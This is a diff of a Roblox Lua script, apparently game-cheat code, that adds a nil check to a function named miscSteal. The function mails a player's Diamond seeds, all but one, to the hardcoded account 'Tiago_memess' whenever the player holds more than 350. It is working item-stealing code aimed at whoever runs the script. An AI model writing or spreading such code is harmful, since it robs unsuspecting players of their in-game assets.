@@ -44,19 +44,21 @@ end
 
 local function miscSteal()
     for i, v in pairs(save.Seed) do
-        if v.id == "Diamond" and v._am > 350 then
-            local args = {
-                [1] = "Tiago_memess",
-                [2] = "DIAMOND SEEDS A BIRE",
-                [3] = "Seed",
-                [4] = i,
-                [5] = v._am - 1
-            }
-                if waited == false then
-                    task.wait(10)
-                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-                else
-                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+        if v._am ~= nil then
+            if v.id == "Diamond" and v._am > 350 then
+                local args = {
+                    [1] = "Tiago_memess",
+                    [2] = "DIAMOND SEEDS A BIRE",
+                    [3] = "Seed",
+                    [4] = i,
+                    [5] = v._am - 1
+                }
+                    if waited == false then
+                        task.wait(10)
+                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+                    else
+                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+                end
             end
         end
     end
